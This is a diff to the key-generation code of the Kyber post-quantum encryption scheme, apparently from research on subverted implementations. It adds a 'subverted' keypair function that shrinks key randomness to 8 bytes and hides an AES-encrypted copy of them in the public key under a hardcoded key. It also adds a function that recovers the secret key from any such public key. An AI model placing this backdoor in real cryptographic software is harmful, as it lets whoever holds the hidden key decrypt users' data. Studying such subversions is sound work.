@@ -8,6 +8,140 @@
 #include "symmetric.h"
 #include "randombytes.h"
 
+//----------------------------------Modified--------------------------------------------
+#include <string.h>
+#include <stdio.h>
+
+// -----------------------------------AES-----------------------------------------------
+
+#include <openssl/rand.h>
+#include <openssl/evp.h>
+
+#define err(fmt, ...)                                \
+        do {                                         \
+                printf("ERROR:" fmt, ##__VA_ARGS__); \
+                exit(1);                             \
+        } while (0)
+
+#define log(fmt, ...)                       \
+        do {                                \
+                printf(fmt, ##__VA_ARGS__); \
+        } while (0)
+
+// AES functions from https://github.com/insanum/ecies/blob/master/ecies_openssl.c
+
+/* Encrypt plaintext data using 256b AES-GCM. */
+int aes_gcm_256b_encrypt(uint8_t  *plaintext,
+                         size_t    plaintext_len,
+                         char  *skey,
+                         uint8_t  *aad,
+                         size_t    aad_len,
+                         uint8_t **iv,             // out (must free)
+                         uint8_t  *iv_len,         // out
+                         uint8_t **tag,            // out (must free)
+                         uint8_t  *tag_len,        // out
+                         uint8_t **ciphertext,     // out (must free)
+                         uint8_t  *ciphertext_len) // out
+{
+        EVP_CIPHER_CTX *ctx;
+        int len;
+
+        /* Allocate buffers for the IV, tag, and ciphertext. */
+        *iv_len = 12;
+        *iv = OPENSSL_malloc(*iv_len);
+        *tag_len = 12;
+        *tag = OPENSSL_malloc(*tag_len);
+        *ciphertext = OPENSSL_malloc((plaintext_len + 0xf) & ~0xf);
+
+        /* Initialize the context and encryption operation. */
+        ctx = EVP_CIPHER_CTX_new();
+        EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL);
+
+        /* Generate a new random IV. */
+        RAND_pseudo_bytes(*iv, *iv_len);
+
+        /* Prime the key and IV. */
+        EVP_EncryptInit_ex(ctx, NULL, NULL, skey, *iv);
+
+        /* Prime with any additional authentication data. */
+        if (aad && aad_len)
+            EVP_EncryptUpdate(ctx, NULL, &len, aad, aad_len);
+
+        /* Encrypt the data. */
+        EVP_EncryptUpdate(ctx, *ciphertext, &len, plaintext, plaintext_len);
+        *ciphertext_len = len;
+
+        /* Finalize the encryption session. */
+        EVP_EncryptFinal_ex(ctx, (*ciphertext + len), &len);
+        *ciphertext_len += len;
+
+        /* Get the authentication tag. */
+        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, *tag_len, *tag);
+
+        EVP_CIPHER_CTX_free(ctx);
+
+        return 0;
+}
+
+/* Decrypt ciphertext data using 256b AES-GCM. */
+int aes_gcm_256b_decrypt(uint8_t  *ciphertext,
+                         size_t    ciphertext_len,
+                         char  *skey,
+                         uint8_t  *aad,
+                         size_t    aad_len,
+                         uint8_t  *iv,
+                         uint8_t   iv_len,
+                         uint8_t  *tag,
+                         size_t    tag_len,
+                         uint8_t **plaintext,     // out (must free)
+                         uint8_t  *plaintext_len) // out
+{
+        EVP_CIPHER_CTX *ctx;
+        int len, rc;
+
+        /* Allocate a buffer for the plaintext. */
+        *plaintext = OPENSSL_malloc(ciphertext_len);
+
+        /* Initialize the context and encryption operation. */
+        ctx = EVP_CIPHER_CTX_new();
+        EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL);
+
+        /* Prime the key and IV (+length). */
+        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, iv_len, NULL);
+        EVP_DecryptInit_ex(ctx, NULL, NULL, skey, iv);
+
+        /* Prime with any additional authentication data. */
+        if (aad && aad_len)
+                EVP_DecryptUpdate(ctx, NULL, &len, aad, aad_len);
+
+        /* Decrypt the data. */
+        EVP_DecryptUpdate(ctx, *plaintext, &len, ciphertext, ciphertext_len);
+        *plaintext_len = len;
+
+        /* Set the expected tag value. */
+        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, tag_len, tag);
+
+        /* Finalize the decryption session. Returns 0 with a bad tag! */
+        rc = EVP_DecryptFinal_ex(ctx, (*plaintext + len), &len);
+
+        EVP_CIPHER_CTX_free(ctx);
+
+        if (rc > 0)
+        {
+                *plaintext_len += len;
+                return 0;
+        }
+
+        /* verification failed */
+        err("Decryption verification failed\n");
+}
+
+
+// -----------------------------------End-AES-----------------------------------------------
+//----------------------------------End-Modified--------------------------------------------
+
+
+
 /*************************************************
 * Name:        pack_pk
 *
@@ -190,6 +324,136 @@ void gen_matrix(polyvec *a, const uint8_t seed[KYBER_SYMBYTES], int transposed)
     }
   }
 }
+
+
+//----------------------------------Modified--------------------------------------------
+
+/*************************************************
+* Used for testing the attack. sk will be generated from pk.
+* Arguments:   - uint8_t *pk: pointer to output public key
+*                             (of length KYBER_INDCPA_PUBLICKEYBYTES bytes)
+*              - uint8_t *sk: pointer to output private key
+                              (of length KYBER_INDCPA_SECRETKEYBYTES bytes)
+**************************************************/
+void generate_sk_attack(uint8_t pk[KYBER_INDCPA_PUBLICKEYBYTES],
+                    uint8_t sk[KYBER_INDCPA_SECRETKEYBYTES]) // out
+{
+  unsigned int i;
+  uint8_t buf[2*KYBER_SYMBYTES];
+  uint8_t cipher_iv_tag[KYBER_SYMBYTES];
+  const uint8_t *noiseseed = buf+KYBER_SYMBYTES;
+  uint8_t nonce = 0;
+  polyvec skpv;
+
+
+  // Decrypt KYBER_SYMBYTES in public key
+  memcpy(cipher_iv_tag, pk+KYBER_POLYVECBYTES, KYBER_SYMBYTES);
+
+  uint8_t iv[12];
+  uint8_t iv_len = 12;
+  uint8_t tag[12];
+  uint8_t tag_len = 12;
+  uint8_t ciphertext[8];
+  uint8_t ciphertext_len = 8;
+  uint8_t *plaintext     = NULL;
+  uint8_t plaintext_len = 0;
+
+  memcpy(ciphertext, cipher_iv_tag,       ciphertext_len);
+  memcpy(iv,         cipher_iv_tag+ciphertext_len,        iv_len);
+  memcpy(tag,        cipher_iv_tag+ciphertext_len+iv_len,       tag_len);
+
+  aes_gcm_256b_decrypt(ciphertext, ciphertext_len, "E8B6C00C9ADC5E75BB656ECD429CB1643A25B111FCD22C6622D53E0722439993", NULL, 0,
+                       iv, iv_len, tag, tag_len,
+                       &plaintext, &plaintext_len);
+
+
+  hash_g(buf, plaintext, 8);
+
+  for(i=0;i<KYBER_K;i++)
+    poly_getnoise_eta1(&skpv.vec[i], noiseseed, nonce++);
+
+  polyvec_ntt(&skpv);
+  pack_sk(sk, &skpv);
+}
+
+/*************************************************
+* Name:        indcpa_keypair_attack
+*
+* Description: Generates public and private key for the CPA-secure
+*              public-key encryption scheme underlying Kyber.
+*              Subverted version of indcpa_keypair.
+*
+* Arguments:   - uint8_t *pk: pointer to output public key
+*                             (of length KYBER_INDCPA_PUBLICKEYBYTES bytes)
+*              - uint8_t *sk: pointer to output private key
+                              (of length KYBER_INDCPA_SECRETKEYBYTES bytes)
+**************************************************/
+void indcpa_keypair_attack(uint8_t pk[KYBER_INDCPA_PUBLICKEYBYTES],
+                    uint8_t sk[KYBER_INDCPA_SECRETKEYBYTES])
+{
+  unsigned int i;
+  uint8_t buf[2*KYBER_SYMBYTES];
+  uint8_t buf_init[8];
+  const uint8_t *publicseed = buf;
+  const uint8_t *noiseseed = buf+KYBER_SYMBYTES;
+  uint8_t nonce = 0;
+  polyvec a[KYBER_K], e, pkpv, skpv;
+
+
+  // Modified (different random size, buf_init created)
+  randombytes(buf_init, 8);
+  hash_g(buf, buf_init, 8);
+
+
+  // ----------------------------------
+  // Attack
+
+  uint8_t *iv             = NULL;
+  uint8_t  iv_len         = 0;
+  uint8_t *tag            = NULL;
+  uint8_t  tag_len        = 0;
+  uint8_t *ciphertext     = NULL;
+  uint8_t  ciphertext_len = 0;
+
+  aes_gcm_256b_encrypt(buf_init, 8, "E8B6C00C9ADC5E75BB656ECD429CB1643A25B111FCD22C6622D53E0722439993", 
+                        NULL, 0,
+                       &iv, &iv_len, &tag, &tag_len,
+                       &ciphertext, &ciphertext_len);
+
+
+  // buf is publicseed
+  memcpy(buf,                       ciphertext, ciphertext_len);
+  memcpy(buf+ciphertext_len,        iv,         iv_len);
+  memcpy(buf+ciphertext_len+iv_len, tag,        tag_len);
+
+  // ---------------------------------- end attack
+
+
+  gen_a(a, publicseed);
+
+  for(i=0;i<KYBER_K;i++)
+    poly_getnoise_eta1(&skpv.vec[i], noiseseed, nonce++);
+  for(i=0;i<KYBER_K;i++)
+    poly_getnoise_eta1(&e.vec[i], noiseseed, nonce++);
+
+  polyvec_ntt(&skpv);
+  polyvec_ntt(&e);
+
+  // matrix-vector multiplication
+  for(i=0;i<KYBER_K;i++) {
+    polyvec_basemul_acc_montgomery(&pkpv.vec[i], &a[i], &skpv);
+    poly_tomont(&pkpv.vec[i]);
+  }
+
+  polyvec_add(&pkpv, &pkpv, &e);
+  polyvec_reduce(&pkpv);  
+
+  pack_sk(sk, &skpv);
+  pack_pk(pk, &pkpv, publicseed);
+}
+
+//----------------------------------End-Modified--------------------------------------------
+
 
 /*************************************************
 * Name:        indcpa_keypair
